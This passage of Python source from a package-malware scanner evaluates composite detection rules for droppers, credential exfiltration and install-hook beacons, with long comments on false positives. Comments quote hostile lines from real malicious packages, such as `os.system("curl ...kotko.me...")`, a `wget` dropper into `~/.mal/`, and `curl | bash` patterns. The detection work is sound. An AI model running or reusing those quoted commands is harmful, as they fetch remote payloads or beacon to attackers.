        text = content.raw[hit.byte_start : max(end, hit.byte_start + 1)].decode("utf-8", "replace")
        if cls._PLATFORM_LOOKUP.match(text):
            return True
        read = cls._SETTING_READ.match(text)
        if read is None:
            return False
        from cordon_scanner.detect.secretflow import CREDENTIAL_HOMES

        name = read.group("dotted") or read.group("quoted") or ""
        return not any(pattern.match(name) for pattern, _ in CREDENTIAL_HOMES)

    BYTES_PER_LINE = 200
    """How far apart in bytes `proximity` lines are allowed to be.

    Proximity is a line count, and a minifier deletes lines. On a bundle the
    whole file is line 1, so "within five lines" means "anywhere in the file"
    and a composite that was written to say *this file does both things in the
    same breath* silently becomes *this file does both things*.

    `ethers`, the most used Ethereum library there is, showed this: two hits at
    line 1 of `dist/ethers.min.js`, thousands of bytes apart, reported as
    private key material sent to the network at CRITICAL. And a MALICIOUS
    composite is deliberately exempt from the minified ceiling -- malware is not
    excused for being generated -- so nothing downstream would have caught it.

    Two hundred bytes a line is generous for real source, where the mean is
    nearer forty, so this never narrows a window on code somebody wrote by hand.
    What it does is stop a window from spanning a bundle."""

    MAX_PROXIMITY_HITS = 400
    """Above this many capability hits, the pairwise search gives way to `_dense_window`.

    The search is quadratic in the number of hits, and a file with four hundred of them is
    generated or enormous. It used to fall back to file scope there -- reporting more, on the
    theory that more is safe -- which made every large bundle a single window."""

    def _satisfying_window(
        self,
        compiled: CompiledRule,
        hits: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool = False,
        deferred: frozenset[tuple[int, int]] = frozenset(),
    ) -> list[CapabilityHit] | None:
        """The hits that satisfy this composite, or `None` if none do.

        With no `proximity` the window is the whole file, which is what every
        composite meant before proximity existed. With one, the capabilities
        must appear within that many lines of each other -- so a claim that a
        file fetches and executes becomes a claim that one *part* of it does,
        which is what the message has always said.
        """
        proximity = compiled.match.proximity
        if (
            proximity > 0
            and in_hook
            and hits
            and (
                max(h.line for h in hits) <= self.SMALL_HOOK_LINES
                # Lines of ordinary length: a minified bundle's 300 lines are a whole library.
                and max(h.byte_start for h in hits) <= 160 * self.SMALL_HOOK_LINES
                # And written by hand: an editor extension's compiled entry is a bundle whose
                # first hundred lines hold unrelated libraries (review 98: about twenty Open VSX
                # AI-coding extensions read as one install-time act).
                and not self._bundled_path(path)
            )
        ):
            # An install script a few hundred lines long runs top to bottom, and its parts are one
            # act: `@testcarrot/supply6` reads the username in one function and writes it to a raw
            # socket from another 25 lines below, past a 30-line window (review 98). Proximity
            # separates the halves of a library; it does not separate the halves of a hook.
            proximity = 0
        if proximity <= 0:
            if self._evaluate_over(
                compiled, hits, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return hits
            return None
        if len(hits) > self.MAX_PROXIMITY_HITS:
            return self._dense_window(
                compiled, hits, path, in_hook, in_ci, in_consumer, deferred, proximity
            )

        # Sorted by line ALONE, and stably. Adding `byte_start` to the key looks
        # harmless and is not: a window is `ordered[index:]`, so it drops every
        # hit that sorts earlier, and the AST tier's `fixed` marker sits on the
        # same line as the pattern hit it qualifies. Reordering the two put the
        # marker behind the window, `fixed_lines` came out empty, and
        # `subprocess.run(["git", "rev-parse", "HEAD"])` -- an argv written out
        # in full -- satisfied `SUSPECT.DECODE_EXEC.001` again. The existing
        # test for it is what caught this.
        ordered = sorted(hits, key=lambda h: h.line)
        byte_limit = proximity * self.BYTES_PER_LINE
        for index, first in enumerate(ordered):
            limit = first.line + proximity
            window = [
                h
                for h in ordered[index:]
                if h.line <= limit and abs(h.byte_start - first.byte_start) <= byte_limit
            ]
            if self._evaluate_over(
                compiled, window, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return window
        return None

    SMALL_HOOK_LINES: ClassVar[int] = 300
    """Install-time code whose every capability sits within this many lines is one window."""

    def _dense_window(
        self,
        compiled: CompiledRule,
        hits: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool,
        deferred: frozenset[tuple[int, int]],
        proximity: int,
    ) -> list[CapabilityHit] | None:
        """Proximity over a file with more hits than the pairwise search affords.

        The file used to be one window past `MAX_PROXIMITY_HITS`, which in a bundle means any
        credential read and any request anywhere in ten megabytes are "together": a 27 MB agent
        extension's secret-redaction table (`hooks.slack.com/<redacted>`) and its help text
        (`"Read(~/.zshrc)"`) were blocked as malware (review 98). Here each hit is the centre of
        the bytes within `proximity * BYTES_PER_LINE` either side, found by bisection over the
        hits sorted by offset -- symmetric, so a marker that sorts just before its pattern hit is
        still in the window -- and a window identical to the last is not evaluated twice.
        """
        import bisect

        byte_limit = proximity * self.BYTES_PER_LINE
        by_byte = sorted(hits, key=lambda h: h.byte_start)
        starts = [h.byte_start for h in by_byte]
        last: tuple[int, int] | None = None
        for centre in by_byte:
            lo = bisect.bisect_left(starts, centre.byte_start - byte_limit)
            hi = bisect.bisect_right(starts, centre.byte_start + byte_limit)
            if (lo, hi) == last:
                continue
            last = (lo, hi)
            window = [h for h in by_byte[lo:hi] if abs(h.line - centre.line) <= proximity]
            if self._evaluate_over(
                compiled, window, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return window
        return None

    def _evaluate_over(
        self,
        compiled: CompiledRule,
        window: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool = False,
        deferred: frozenset[tuple[int, int]] = frozenset(),
        *,
        all_hits: list[CapabilityHit] | None = None,
    ) -> bool:
        all_hits = window if all_hits is None else all_hits
        # A spawn whose whole argv is written out in the source does not count.
        #
        # Every composite that names `spawn` uses it as evidence that something
        # unknown runs -- decoded data, a downloaded file, a credential's worth of
        # harvested output. `subprocess.run(["git", "rev-parse", "--short", "HEAD"])`
        # cannot be any of those: what it runs is in the file, in front of the
        # reader.
        #
        # `NousResearch/hermes-agent` produced eleven `SUSPECT.DECODE_EXEC.001`
        # anchored on exactly that shape -- `["ldd", "--version"]`, `["launchctl",
        # "list", label]`, `["git", "rev-parse"]` -- each paired with a base64
        # decode somewhere else in the file. Across the corpus `SUSPECT.DECODE_EXEC
        # .001` was 684 findings in 252 of 1,487 repositories.
        #
        # What keeps the real cases is that a constant argv is ANALYSED rather than
        # trusted: `os.system("curl x | sh")` is constant too, and the embedded-shell
        # tier extracts the fetch and the pipe from it as capabilities of their own,
        # which satisfy the composite on their own terms. And a constant command
        # naming a temporary or relative path is not treated as fixed at all, because
        # that is where a dropper puts its payload.
        # By LINE, not by hit. The pattern tier and the AST tier both see the same
        # call -- `CAP.PY.SPAWN.001@222` and `AST.PY.SPAWN@222` -- and only the AST
        # tier can say whether the argv was written out, so dropping its own hit
        # alone left the pattern tier's to satisfy the term anyway.
        # Unless the argv that was written out is ITSELF the act. The discount rests
        # on one claim -- that a spawn whose whole command is visible cannot be
        # running something decoded or downloaded -- and that claim holds for
        # `subprocess.run(["git", "rev-parse", "--short", "HEAD"])` and fails
        # completely for `os.system("curl https://kotko.me/analyze.php?procoder")`.
        # Both are fully literal. In the second the literal is the attack, and being
        # readable is not the same as being harmless.
        #
        # So a line whose command carried a capability of its own keeps its spawn.
        # `CAP.SH.*` is the marker for that: those hits exist only because the shell
        # rules were applied to the command string a spawn was handed, so one on this
        # line means the argv itself fetches, decodes or persists.
        #
        # Measured. `procoder`'s `setup.py` is `os.system("curl <url>")` and nothing
        # else; the spawn was discounted, only `egress` survived, and
        # `MALWARE.DROPPER.001` needs both -- so an install-time beacon in four lines
        # of Python produced no finding. Six of the packages still missed after the
        # reconnaissance work were this shape, `duc193`'s
        # `os.system("wget -O ~/.mal/.neofetch.py <url>")` among them.
        #
        # Computed over every hit in the FILE rather than over the window, and
        # that is load-bearing rather than tidy. "This line's argv is written
        # out in full" is a fact about the line; which window happens to be
        # under evaluation cannot change it. Scoping it to the window made the
        # discount depend on hit ORDER, because a window is `ordered[index:]`
        # and drops everything sorting earlier -- so a window starting at a
        # spawn hit that sorted after the `fixed` marker on the same line
        # contained no marker at all, `fixed_lines` came out empty, and the
        # discount silently did not apply.
        #
        # This is the second time that shape has bitten. The comment on
        # `ordered` records the first: adding `byte_start` to the sort key
        # reordered the marker behind the window and `subprocess.run(["git",
        # "rev-parse", "--short", "HEAD"])` satisfied `SUSPECT.DECODE_EXEC.001`
        # again. It was fixed by preserving the order, which left the real
        # fragility in place -- appending any new spawn-labelling tier after
        # the marker reproduced it exactly, and adding the `ast` match kind
        # did. Taking the fact from the file removes the ordering dependency
        # instead of restating the rule that protects it.
        speaking_argv = {
            hit.line
            for hit in all_hits
            if hit.rule_id.startswith("CAP.SH.") and hit.capability is not Capability.SPAWN
        }
        fixed_lines = {hit.line for hit in all_hits if hit.fixed} - speaking_argv
        window = [
            hit
            for hit in window
            if not (hit.capability is Capability.SPAWN and hit.line in fixed_lines)
        ]
        # The file runs at install time; this window has to as well. If any hit
        # in it sits in a body the hooks never call, the pair the composite
        # describes is not something that happens during an install -- so the
        # `context: install_hook` term is not satisfied for THIS window, even
        # though it is for the file.
        #
        # `any` rather than `all`: the claim is that these capabilities occur
        # together during an install, and one half of the pair sitting in dead
        # code is enough for that not to be true.
        if in_hook and deferred and any(LineRanges.cls_in(hit.line, deferred) for hit in window):
            in_hook = False

        present = {hit.capability for hit in window}
        counts: Counter[Capability] = Counter()
        for hit in window:
            if not hit.resolved:
                counts[hit.capability] += hit.variants
        fired = frozenset(hit.rule_id for hit in window)
        return self._evaluate(compiled, present, path, in_hook, counts, fired, in_ci, in_consumer)

    def _evaluate(
        self,
        compiled: CompiledRule,
        present: set[Capability],
        path: str,
        in_hook: bool = False,
        counts: Counter[Capability] | None = None,
        fired: frozenset[str] = frozenset(),
        in_ci: bool = False,
        in_consumer: bool = False,
    ) -> bool:
        """Evaluate a composite expression against the capabilities present.

        Supports ``all``, ``any``, nested combinations, and ``unless``. Kept
        deliberately small: a composite rule is read by somebody deciding whether
        a security finding is justified, and an expression language rich enough
        to be clever is one nobody can review.
        """
        match = compiled.match
        counts = counts if counts is not None else Counter(present)

        if match.all_of and not all(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.all_of
        ):
            return False
        if match.any_of and not any(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.any_of
        ):
            return False
        return not any(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.unless
        )

    def _term(
        self,
        term: object,
        present: set[Capability],
        *,
        path: str | None = None,
        in_hook: bool = False,
        in_ci: bool = False,
        in_consumer: bool = False,
        counts: Counter[Capability] | None = None,
        fired: frozenset[str] = frozenset(),
    ) -> bool:
        if not isinstance(term, dict):
            return False

        if "capability" in term:
            try:
                capability = Capability(str(term["capability"]))
            except ValueError:
                return False
            required = term.get("at_least")
            if required is None:
                return capability in present
            # Depth, not presence. `decode` twice in one file is a decode
            # chain -- base64 into decompress into execute -- and that is a
            # stronger claim than decoding once, because a single decode has
            # ordinary uses and stacking them has none.
            observed = (counts or Counter(present))[capability]
            return observed >= int(required)

        # A named indicator rather than a capability.
        #
        # Some evidence is not a behaviour, it is a destination: posting to a
        # Discord webhook and posting to a metrics endpoint are both `egress`,
        # and the capability model deliberately cannot tell them apart. This
        # term lets a composite say "that specific rule fired" without
        # inventing a capability for every indicator, which is what would
        # otherwise happen and would dilute the primitives until they meant
        # nothing.
        if "rule" in term:
            return str(term["rule"]) in fired

        if "any" in term:
            return any(
                self._term(
                    t,
                    present,
                    path=path,
                    in_hook=in_hook,
                    in_ci=in_ci,
                    in_consumer=in_consumer,
                    counts=counts,
                    fired=fired,
                )
                for t in term["any"] or ()
            )

        if "all" in term:
            return all(
                self._term(
                    t,
                    present,
                    path=path,
                    in_hook=in_hook,
                    in_ci=in_ci,
                    in_consumer=in_consumer,
                    counts=counts,
                    fired=fired,
                )
                for t in term["all"] or ()
            )

        # The negation of a term.
        #
        # `unless` already refuses a composite by path, and that is the only
        # thing this model could say "not" about. The case that needed more:
        # `SUSPECT.DECODE_EXEC.001` pairs a decode with a process start, and in
        # shell every command is a process -- so `key=$(echo "$b" | base64 -d)`,
        # which is how a shell script decodes anything at all, matched a rule
        # whose message says the decoded value was executed. The primitive is
        # right and it is not evidence of that claim in that one language, which
        # is a statement about a specific capability rule rather than about a
        # path or a context.
        if "not" in term:
            return not self._term(
                term["not"],
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )

        if "path_glob" in term and path is not None:
            from cordon_scanner.core.walker import PathGlob

            return PathGlob.matches(path, str(term["path_glob"]))

        # Execution context as a first-class term.
        #
        # This is what lets a rule say "credential access plus network egress,
        # in an install hook" without also requiring an execution primitive. In
        # application code that pairing needs a third signal to be meaningful,
        # because reading configuration and calling an API is what an
        # application does all day. In an install hook it does not: the hook IS
        # the execution, so the pair alone is already the whole attack.
        if "context" in term:
            named = str(term["context"])
            if named == "install_hook":
                return in_hook
            if named == "ci_hook":
                return in_ci
            if named == "consumer_install":
                return in_consumer
            if named == "install_entry":
                return in_hook and getattr(self, "_in_entry", False)
            if named == "import_entry":
                return getattr(self, "_in_import_entry", False)
            return False

        return False

    @staticmethod
    def _capabilities_of(compiled: CompiledRule) -> tuple[Capability, ...]:
        """Every capability named anywhere in a composite expression."""
        found: list[Capability] = []

        def walk(term: object) -> None:
            if not isinstance(term, dict):
                return
            if "capability" in term:
                with suppress(ValueError):
                    found.append(Capability(str(term["capability"])))
            for key in ("all", "any"):
                for nested in term.get(key) or ():
                    walk(nested)

        for term in (*compiled.match.all_of, *compiled.match.any_of):
            walk(term)
        return tuple(dict.fromkeys(found))

    #: How much of the finding each capability carries, most specific first.
    #: A compound primitive names the whole act by itself -- `fetch_exec` IS
    #: "the download is the interpreter's input" -- while `egress` and `spawn`
    #: are the two that appear in ordinary code constantly.
    ANCHOR_SPECIFICITY: ClassVar[tuple[Capability, ...]] = (
        Capability.FETCH_EXEC,
        Capability.DESERIALIZE,
        Capability.EXECUTE,
        Capability.DYNAMIC_DISPATCH,
        Capability.WALLET,
        Capability.MINE,
        Capability.CREDENTIAL,
        Capability.PERSIST,
        Capability.DESTROY,
        Capability.ANTI_ANALYSIS,
        Capability.TARGETING,
        Capability.DECODE,
        Capability.DECOMPRESS,
        Capability.RECONNAISSANCE,
        Capability.DELAY,
        Capability.SPAWN,
        Capability.EGRESS,
    )

    @staticmethod
    def _anchor(
        matched: tuple[Capability, ...],
        by_capability: dict[Capability, CapabilityHit],
        hits: list[CapabilityHit],
    ) -> CapabilityHit:
        """Where to point the finding.

        The hit that carries the most of the claim, and the earliest of those.

        This was the earliest hit of any named capability, on the reasoning that
        the first contributing line puts the reader at the start of the
        construct. That holds when the capabilities ARE one construct, and
        `curl ... | bash` -- where every capability is on the one line -- still
        anchors exactly where it did. It fails at the proximity a composite
        allows: `SUSPECT.DROPPER.001` pairs hits up to two hundred lines apart,
        so the earliest is routinely nowhere near the evidence.

        Of sixteen DROPPER findings sampled from the corpus, eight pointed
        somewhere misleading. milvus showed `PWD := $(shell pwd)` on line 13 for
        a `curl | sh` on 143; hiddify showed `ifeq ($(shell uname),Darwin)` on
        34 for one on 162; community-scripts showed twelve lines of figlet ASCII
        ART for a `source <(curl ...)` ten lines below it. Every one of those
        findings was CORRECT, and every one of them reads as a tool that does
        not know what it is looking at -- which is the more expensive failure,
        because a false positive is argued with and this is simply disbelieved.
        """
        relevant = [by_capability[c] for c in matched if c in by_capability]
        order = CapabilityDetector.ANCHOR_SPECIFICITY

        def rank(hit: CapabilityHit) -> int:
            try:
                return order.index(hit.capability)
            except ValueError:
                # A primitive nobody has graded yet sorts between the compound
                # ones and the two broad ones, rather than winning by accident.
                return len(order) - 2

        return min(relevant or hits, key=lambda h: (rank(h), h.byte_start))

    MIN_IDIOM_BYTES = 40
    """How long the shared construct must be to be worth grouping on.

    The same forty bytes `Engine.MIN_IDIOM_SNIPPET` uses, and for its reason:
    `cidr_blocks = ["0.0.0.0/0"]` is twenty-seven and hashes the same in a
    hundred unrelated modules.
    """

    @classmethod
    def _with_idiom_key(
        cls,
        evidence: Evidence,
        content: FileContent,
        matched: tuple[Capability, ...],
        hits: list[CapabilityHit],
    ) -> Evidence:
        """Carry a second hash: the one `Engine._collapse_idiom` groups on.

        Those two questions had one answer and they are not the same question.
        The evidence should point at the hit that carries the claim -- that is
        what `_anchor` is for, and why `community-scripts/ProxmoxVE` stopped
        being shown twelve lines of figlet ASCII art. The COLLAPSE has to group
        on the part that is shared, which is the generic half: six hundred of
        that repository's container scripts open with a byte-identical
        `source <(curl -fsSL .../build.func)`, and that line is what makes them
        one decision applied six hundred times rather than six hundred findings.

        Keying the collapse on the evidence meant moving the anchor silently
        switched the collapse off: its persistence findings went from one to
        twenty-seven in a single pass, which is how this was noticed at all.

        So the anchor stays the most specific hit and this is the broadest one.
        Absent when the shared construct is too short to be specific, which is
        the same condition the collapse applies to a snippet.
        """
        broadest = cls._broadest(matched, hits)
        if broadest is None:
            return evidence
        raw = content.raw[broadest.byte_start : broadest.byte_end]
        if len(raw) < cls.MIN_IDIOM_BYTES:
            return evidence
        metadata = dict(evidence.metadata)
        metadata["idiom_hash"] = Evidence.hash_bytes(raw)
        return replace(evidence, metadata=tuple(sorted(metadata.items())))

    @classmethod
    def _broadest(
        cls, matched: tuple[Capability, ...], hits: list[CapabilityHit]
    ) -> CapabilityHit | None:
        """The least specific contributing hit -- the mirror of `_anchor`."""
        order = cls.ANCHOR_SPECIFICITY
        wanted = set(matched)
        relevant = [h for h in hits if h.capability in wanted] or hits
        if not relevant:
            return None

        def rank(hit: CapabilityHit) -> tuple[int, int]:
            try:
                index = order.index(hit.capability)
            except ValueError:
                index = len(order) - 2
            return (-index, hit.byte_start)

        return min(relevant, key=rank)

    #: Credentials whose issuer is known, and the hosts that issue them.
    #:
    #: Sending a service's own token to that service is authentication. It is
    #: what the token is FOR, it happens in every CI script and packaging script
    #: that reads a private repository, and it gives an attacker nothing: the
    #: host already knows the credential.
    ISSUER_HOSTS: ClassVar[tuple[tuple[tuple[bytes, ...], tuple[bytes, ...]], ...]] = (
        ((b"GITHUB_TOKEN", b"GH_TOKEN", b"GITHUB_PAT"), (b"github.com", b"githubusercontent.com")),
        ((b"GITLAB_TOKEN", b"CI_JOB_TOKEN"), (b"gitlab.com",)),
        ((b"NPM_TOKEN", b"NODE_AUTH_TOKEN"), (b"registry.npmjs.org", b"npmjs.com")),
        ((b"PYPI_TOKEN", b"TWINE_PASSWORD"), (b"pypi.org", b"files.pythonhosted.org")),
        ((b"CARGO_REGISTRY_TOKEN",), (b"crates.io",)),
        ((b"DOCKER_TOKEN", b"DOCKERHUB_TOKEN"), (b"docker.io", b"index.docker.io")),
        ((b"AWS_SECRET_ACCESS_KEY", b"AWS_SESSION_TOKEN"), (b"amazonaws.com",)),
    )

    HOST_IN_URL = re.compile(rb"https?://([A-Za-z0-9._-]{4,253})")

    @classmethod
    def _credential_reaches_its_own_issuer(
        cls, content: FileContent, window: list[CapabilityHit]
    ) -> bool:
        """Whether every credential here is being sent to the host that issued it.

        `vllm`'s `setup.py` asks GitHub which commit `main` is on, and
        authenticates so the request is not rate-limited:

            github_token = os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))
            curl_cmd += ["-H", f"Authorization: token {github_token}"]

        A credential read, an outbound request, and an install-time context --
        `MALWARE.EXFIL.001` at CRITICAL, in the MALICIOUS category, telling the
        reader to treat their host as compromised. `pytorch`'s `torch/hub.py`
        does the same thing for the same reason.

        Nothing is exfiltrated. The host being contacted is the one that issued
        the token, already knows it, and is the only party the token is good
        against. This is what the credential is for.

        Narrow on purpose, and in the safe direction: it takes effect only when
        EVERY host named in the window belongs to the issuer of EVERY credential
        named in it. A payload that reads `GITHUB_TOKEN` and posts it anywhere
        else names another host and is untouched -- which is the whole attack
        this rule exists to catch.
        """
        if not window:
            return False
        lines = content.line_starts
        first = min(h.byte_start for h in window)
        last = max(h.byte_end for h in window)
        del lines
        text = content.raw[first:last]
        if not text:
            return False

        hosts = {m.group(1).lower() for m in cls.HOST_IN_URL.finditer(text)}
        if not hosts:
            return False

        issuers: list[tuple[bytes, ...]] = []
        for names, owned in cls.ISSUER_HOSTS:
            if any(name in text for name in names):
                issuers.append(owned)
        if not issuers:
            return False

        def owned_by_some_issuer(host: bytes) -> bool:
            return any(
                host == owner or host.endswith(b"." + owner) for owned in issuers for owner in owned
            )

        return all(owned_by_some_issuer(host) for host in hosts)

    def _composite_finding(
        self,
        compiled: CompiledRule,
        unit: FileUnit,
        ctx: ScanContext,
        anchor: CapabilityHit,
        matched: tuple[Capability, ...],
        hits: list[CapabilityHit],
        *,
        file_hits: list[CapabilityHit] | None = None,
    ) -> Finding | None:
        rule = compiled.rule
        content = unit.content
        # A prebuilt binary from the package's own release, checked against a digest it ships
        # before anything runs (review 98, FP-2: `@ohos-ports/larksuite-cli`). Read over the whole
        # file's hits, not this window's: a credential read anywhere in it keeps the dropper.
        verified = rule.id in self.VERIFIABLE_DROPPERS and self._verified_release_download(
            unit, ctx, hits if file_hits is None else file_hits
        )

        mode = Redactor.effective_mode(rule.evidence_policy, ctx.config.evidence)
        evidence = Redactor.build_evidence(content, anchor.byte_start, anchor.byte_end, mode)
        evidence = self._with_idiom_key(evidence, content, matched, hits)

        present = {h.capability for h in hits}
        in_hook = ctx.in_install_hook(content.path)
        if (
            in_hook
            and rule.id == self.DROPPER_RULE
            and SourcePaths.is_editor_extension(content.path)
            and not CapabilityDetector._runs_a_downloaded_file(hits)
        ):
            # An extension's activation entry is in the install-hook set so that a beacon there is
            # reported as one; a download it then starts is how extensions fetch their own tools,
            # and is not escalated as an install-time dropper. See `MALWARE.DROPPER.001` above.
            in_hook = False
        if rule.id in self.CONTEXT_FREE:
            in_hook = False
        if verified and rule.id == self.DROPPER_RULE:
            # Not escalated as an install-time dropper either: the hook escalation would put the
            # span straight back at CRITICAL. The ceiling below says why it is still reported.
            in_hook = False

        severity = RiskScorer.apply_category_floor(rule.category, rule.severity)
        category = rule.category
        escalations: list[str] = []

        # Test material and documentation get a severity ceiling, the way the secrets
        # detector has always given them one. The composites had none, so a file
        # written to demonstrate a dangerous pattern was reported as though it were
        # one in production.
        #
        # `bandit/examples/marshal_deserialize.py` is the clearest case: a file whose
        # entire purpose is to be an example of unsafe deserialisation, in a security
        # tool's `examples/` directory, reported at HIGH as decode-and-execute. It is
        # not wrong about what the file does. It is wrong about what a reader should
        # do next. The same applies to Airflow's, pydantic's and scrapy's test files,
        # which were four of nineteen findings from one rule across eighteen
        # repositories.
        #
        # A ceiling and not a suppression, and the ordering matters: the install-hook
        # escalation below is applied AFTER, so a payload in a file that happens to sit
        # under `tests/` and runs at install time still reaches CRITICAL. The ceiling
        # is about where a pattern was written, and the hook is about when it runs.
        #
        # MALICIOUS is never ceilinged. A dropper in a fixture directory is still a
        # dropper, and "we have not fixed this yet" is not a coherent position to hold
        # about evidence of intent - which is the same reasoning the baseline applies.
        # A MALICIOUS claim about a CI script needs the fetch to be opaque.
        #
        # The composite admits `ci_hook` alongside `install_hook`, correctly: a
        # compromised pipeline running what it downloaded is a real, observed attack.
        # But an install hook runs on every consumer's machine, unprompted, while a CI
        # script runs only in the pipeline the project controls -- so for CI the
        # category rests entirely on the fetch being unreviewable, and a pinned one is
        # not.
        #
        # Withdrawn rather than demoted, and the rule id is why. `MALWARE.DROPPER.001`
        # reported with `category: suspicious` is self-contradictory: the id namespace
        # encodes the category, a consumer filtering on `MALWARE.*` gets it anyway, and
        # the taxonomy derives a threat domain from the prefix. The first attempt at
        # this demoted the category and left the id, which produced exactly that.
        #
        # Nothing is lost by withdrawing it. `SUSPECT.DROPPER.001` fires on the same
        # span, at a severity the evidence supports, with remediation a maintainer can
        # act on - copy the script into the repository, or verify a digest. What stops
        # being said is "treat the host as compromised and report the package to the
        # registry", which is advice about a package somebody installed and means
        # nothing to the owner of a `.buildkite` script.
        if compiled.rule.id in self.EXFIL_RULES and self._credential_for_its_own_service(content):
            return None

        if (
            compiled.rule.id == "MALWARE.DROPPER.001"
            and SourcePaths.is_editor_extension(content.path)
            and not CapabilityDetector._runs_a_downloaded_file(hits)
        ):
            # Withdrawn for the reason above. An extension's activation entry runs unasked, as an
            # install hook does -- which is what catches a beacon there -- but an extension that
            # fetches and starts its own tools (Codespaces, APKLab, DOSBox) is not a compromised
            # host. `SUSPECT.DROPPER.001` reports the same span, below the gate. A download
            # written to an executable and started keeps this rule: that is the malicious shape.
            return None

        if (
            verified
            and compiled.rule.id == "MALWARE.DROPPER.001"
            and self._suspect_dropper_reports(ctx, content.path, hits)
        ):
            # Withdrawn for the reason above, and only where `SUSPECT.DROPPER.001` reports the same
            # span, so the file is never left clean. What is withdrawn is the claim that the content
            # is whatever the host serves: the release URL is a literal, and the digest it is held
            # to came with the package. What is not withdrawn is the question of what the binary
            # is -- whoever owns the repository owns the release and the checksum too (`08` P3) --
            # so it stays reported at MEDIUM, and every other rule over the file still applies.
            return None

        if rule.id == "MALWARE.EXFIL.BEACON.001" and CapabilityDetector._loopback_only(
            CapabilityDetector._satisfying_region(content, hits)
        ):
            # A daemon's health check on its own port: what reaches 127.0.0.1 never leaves the
            # machine, so it carries nothing anywhere (review 98, FP-3: aigentry-telepty). Any
            # other host or URL in the region keeps the rule.
            return None

        if (
            in_hook
            and rule.id == self.PERSIST_RULE
            and CapabilityDetector._is_formula(content)
            and not CapabilityDetector._writes_near(content, hits)
            and not CapabilityDetector._writes_near(
                content, hits, writes=CapabilityDetector.RUBY_WRITE
            )
        ):
            # A Homebrew formula's `install` and `post_install` run in brew's build sandbox, which
            # lets them write only under the prefix: a formula cannot plant a login item, so it has
            # to be seen writing one. What a formula names is the user's profile in its caveats or
            # `desc`, a LaunchAgent it unloads, an `etc/profile.d` under its own prefix (review 98:
            # 27 formulas in one tap). A cask runs unsandboxed and keeps the rule.
            return None

        if in_hook and SourcePaths.is_editor_extension(content.path):
            # The same reasoning, for the two rules a coding extension trips by talking: its help
            # text names `~/.zshrc` and its secret redactor names `hooks.slack.com`, megabytes of
            # bundle away from any write or request (review 98). In an extension the persistence
            # has to be written and the drop point reached; `SUSPECT.*` still reports the span.
            if rule.id == self.PERSIST_RULE and not CapabilityDetector._writes_near(content, hits):
                return None
            if rule.id == self.CALLBACK_RULE and not any(
                # A request, not the destination's name: the drop point is itself an egress hit.
                h.capability is Capability.EGRESS and not h.rule_id.startswith("INTEL.")
                for h in hits
            ):
                return None

        if (
            category is Category.MALICIOUS
            and not in_hook
            and ctx.in_ci_hook(content.path)
            and CapabilityDetector.PINNED_FETCH.search(
                CapabilityDetector._satisfying_region(content, hits)
            )
        ):
            return None

        if (
            rule.id == "MALWARE.EXFIL.001"
            and CapabilityDetector._agent_run(content, ctx)
            and not CapabilityDetector._names_untrusted_destination(content.raw)
            and not CapabilityDetector._ENVIRONMENT_DUMP.search(content.raw)
        ):
            # A skill's script or an MCP server's handler calling the service it holds a key for
            # is what such a tool is for; at install level it blocked 125 of MalSkillBench's 4,000
            # benign skills (review 98). `SUSPECT.EXFIL.001` still records the pair, and a credential
            # store, a drop point, a beacon or a callback is each its own composite.
            return None

        agent_tool_client = False
        ceilinged = ""
        ceiling = FIXTURE_CEILING
        # Nothing below excuses a file that hid its payload.
        #
        # Every ceiling in the chain makes one argument in different words: this
        # is not really code somebody wrote to run. Test material, documentation,
        # generated output, a vendored library, a minified bundle -- each says
        # "read it somewhere else, or do not read it at all". A run of thousands
        # of invisible characters defeats all of them at once, because none of
        # those things contains one and the only reason to write one is so that a
        # reader does not see it.
        #
        # `@aifabrix/miso-client` needed this. Its payload is 9,123 consecutive
        # variation selectors in `dist/express/error-types.js`, `eval`ed a few
        # lines later. `dist/` is generated output, so the finding came out at
        # MEDIUM and a gate passed it -- the second time in this release a noise
        # ceiling was found holding real malware below the line, after
        # `_is_minified` and the obfuscated Python it excused.
        smuggled = any(hit.rule_id == "CAP.INVISIBLE_SMUGGLING.001" for hit in hits)
        if category is not Category.MALICIOUS and not smuggled:
            hand_run_provisioning = (
                Capability.PERSIST in matched
                and not in_hook
                and not ctx.in_ci_hook(content.path)
                and not ctx.in_consumer_install(content.path)
                and CapabilityDetector._is_hand_run_provisioning(content.path, unit.language)
                # A skill's script is run by the agent whenever the skill is invoked.
                and not CapabilityDetector._skill_script(content.path, ctx)
                and not CapabilityDetector._persists_a_download(content, hits)
            )
            # The credential-egress-execution combination outside anything that runs on its own:
            # a client reading its own key and calling its own service, a deploy script, the
            # Maven wrapper. The composite's message already says it is "a combination to be
            # aware of rather than evidence of anything"; in the long tail it was the only code
            # warning on 259 of 11,005 benign units rescanned, while in 4,269 malware samples it
            # blocked none alone (review 98). Recorded -- unless the file also names a
            # destination nobody sends their own credentials to.
            trusted_destination = not CapabilityDetector._names_untrusted_destination(
                content.raw
            ) and not CapabilityDetector._ENVIRONMENT_DUMP.search(content.raw)
            own_credential_client = (
                compiled.rule.id == "SUSPECT.EXFIL.001"
                and not in_hook
                and not ctx.in_ci_hook(content.path)
                and not ctx.in_consumer_install(content.path)
                and not CapabilityDetector._skill_script(content.path, ctx)
                and not SourcePaths.is_editor_extension(content.path)
                and trusted_destination
            ) or (
                # A skill's script or an MCP server's handler calling the service it was given a
                # key for: agent-run code, graded as install-time for what no tool needs, but a
                # credential sent to an ordinary API is what such a tool is for. Graded at
                # install level, 125 of MalSkillBench's 4,000 benign skills were blocked for it
                # (review 98). A drop point, a raw address or the whole environment still is not;
